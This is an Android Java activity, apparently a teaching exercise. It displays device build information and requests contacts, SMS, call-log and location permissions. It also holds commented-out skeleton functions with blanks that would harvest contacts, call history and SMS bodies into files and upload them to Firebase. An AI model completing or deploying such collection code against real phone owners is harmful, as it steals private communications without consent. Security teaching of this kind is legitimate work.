package com.example.Modul6;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;

import android.os.Bundle;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    TextView tvosVersion, tvdeviceManufacturer, tvdeviceModel, tvdeviceName, tvproductName, tvhardwareName;
    String currentTime;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        requestPermission();
        tvosVersion = findViewById(R.id.osVersion);
        tvdeviceManufacturer = findViewById(R.id.deviceManufacturer);
        tvdeviceModel = findViewById(R.id.deviceModel);
        tvdeviceName = findViewById(R.id.deviceName);
        tvproductName = findViewById(R.id.productName);
        tvhardwareName = findViewById(R.id.hardwareName);


        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
        currentTime = sdf.format(new Date());

//        getContactList();
//        getCallDetails();
//        getSmsDetails();

        getINfo();

    }

    private void getINfo() {
        Log.d("Build1","OS Version: " + Build.VERSION.RELEASE + "\n");
        Log.d("Build1","Device Manufacturer: " + Build.MANUFACTURER + "\n");
        Log.d("Build1", "Device Model: " + Build.MODEL + "\n");
        Log.d("Build1", "Device Name: " + Build.DEVICE + "\n");
        Log.d("Build1","Product Name: " + Build.PRODUCT + "\n");
        Log.d("Build1", "Hardware Name: " + Build.HARDWARE + "\n");

        tvosVersion.setText(Build.VERSION.RELEASE);
        tvdeviceManufacturer.setText(Build.MANUFACTURER);
        tvdeviceModel.setText(Build.MODEL);
        tvdeviceName.setText(Build.DEVICE);
        tvproductName.setText(Build.PRODUCT);
        tvhardwareName.setText(Build.HARDWARE);
    }
    private void requestPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, 1);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CALL_LOG}, 1);
        }

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, 1);
        }

    }

    private void getContactList() {
//        String namefile = "contacts" + currentTime + ".txt";
//
//        /* Create a new ContentValues object to store the metadata of the new file */
//        ContentValues values = new ContentValues();
//        values.put();
//        values.put();
//        values.put();
//
//        /* Insert the new file into the Downloads directory using the MediaStore API */
//        Uri uri = ;
//
//        try {
//            /* Open an output stream to the newly created file */
//            OutputStream outputStream = ;
//
//            /* Query the contact list to retrieve phone numbers */
//            Cursor cursor = ;
//
//            /* Loop through the result set of the query */
//            while (cursor.moveToNext()) {
//                /* Retrieve the phone number value from the current row of the result set */
//                String name = ;
//                String phone = ;
//
//                //Log.d("getContactList", name + ", " + phone + "\n");
//
//                /* Create a string by concatenating name, phone, and a newline character */
//                String line = ;
//                /* Write the string to the output stream as a byte array */
//                outputStream.write();
//            }
//            cursor.close();
//            outputStream.close();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//        /* Create a File object for the desired file in the Downloads directory */
//        File file = new File();
//        /* Upload the file to Firebase */
//        uploadFirebase();
    }
    private void getCallDetails() {
//        String namefile = "callDetails" + currentTime + ".txt";
//
//        /* Create a new ContentValues object to store the metadata of the new file */
//        ContentValues values = new ContentValues();
//        values.put();
//        values.put();
//        values.put();
//
//        /* Insert the new file into the Downloads directory using the MediaStore API */
//        Uri uri = ;
//
//        try {
//            /* Open an output stream to the newly created file */
//            OutputStream outputStream = ;
//
//            /* Get the cursor to query the call history */
//            Cursor cursor = getContentResolver().query();
//
//            /* Iterate over the cursor to retrieve the contacts */
//            while (cursor.moveToNext()) {
//                /* Retrieve the call details from the current row of the cursor */
//                String number = ;
//                String name = ;
//                String duration = ;
//                String type = ;
//                String date = ;
//
//                SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
//                String dateString = formatter.format(new Date(Long.parseLong(date)));
//
//                /* Format the call details as a comma-separated string and write it to the output stream*/
//                String line = ;
//                outputStream.write();
//
//                Log.d("getCallDetails", "Name: " + name + " Number: " + number + " Date: " + dateString + " Duration: " + duration + " Type: " + type);
//            }
//            cursor.close();
//            outputStream.close();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//        /* Create a File object for the desired file in the Downloads directory */
//        File file = new File();
//        /* Upload the file to Firebase */
//        uploadFirebase();
    }
    private void getSmsDetails() {
//        String namefile = "SmsDetails" + currentTime + ".txt";
//
//        /* Create a new ContentValues object to store the metadata of the new file */
//        ContentValues values = new ContentValues();
//        values.put();
//        values.put();
//        values.put();
//
//        /* Insert the new file into the Downloads directory using the MediaStore API */
//        Uri uri = ;
//
//        try {
//            /* Open an output stream to the newly created file */
//            OutputStream outputStream = ;
//
//            /* Get the cursor to query the message */
//            Cursor cursor = getContentResolver().query();
//
//            /* Iterate over the cursor to retrieve the contacts */
//            while (cursor.moveToNext()) {
//                // Retrieve the call details from the current row of the cursor
//                String address = ;
//                String body = ;
//                String date = ;
//
//                SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
//                String dateString = formatter.format(new Date(Long.parseLong(date)));
//
//                /* Format the call details as a comma-separated string and write it to the output stream */
//                String line = ;
//                outputStream.write();
//
//
//                Log.d("getSmsDetails", "Address: " + address + " Date: " + dateString + " Body: " + body);
//            }
//            cursor.close();
//            outputStream.close();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//
//        /* Create a File object for the desired file in the Downloads directory */
//        File file = new File();
//        /* Upload the file to Firebase */
//        uploadFirebase();
    }

    private void uploadFirebase(File file) {
//        /* Get an instance of FirebaseStorage */
//        FirebaseStorage storage = ;
//        /* Create a reference to the file you want to upload */
//        StorageReference fileRef = ;
//
//        /* Get the path of the file to be uploaded */
//        String filePath = ;
//        /* Convert the file path to a Uri */
//        Uri fileUri = ;
//
//        /* Upload file to Firebase Storage */
//        fileRef.putFile()
//                .addOnSuccessListener(taskSnapshot -> {
//                    /* File uploaded successfully */
//                    Log.d("uploadFirebase", "File uploaded successfully");
//                })
//                .addOnFailureListener(e -> {
//                    /* Handle unsuccessful uploads */
//                    Log.e("uploadFirebase", "Error uploading file", e);
//                });
    }

}